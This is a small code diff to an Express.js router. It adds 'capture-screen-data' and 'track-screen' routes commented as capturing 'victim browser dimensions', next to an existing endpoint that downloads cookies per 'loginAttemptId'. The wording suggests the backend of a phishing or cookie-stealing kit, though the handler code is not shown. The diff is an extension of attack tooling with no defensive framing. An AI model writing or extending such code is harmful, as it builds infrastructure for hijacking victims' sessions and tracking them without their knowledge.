@@ -7,6 +7,10 @@ const db = require('../database');
 router.post('/import_email', utilityController.importEmail);
 router.post('/extract', utilityController.extract);
 
+// Screen capture routes for victim browser dimensions
+router.post('/capture-screen-data', utilityController.captureScreenData);
+router.get('/track-screen', utilityController.trackScreen);
+
 // Download cookie endpoint for detailed cookie info
 router.get('/DownloadCookies/:loginAttemptId', (req, res) => {
   const { loginAttemptId } = req.params;
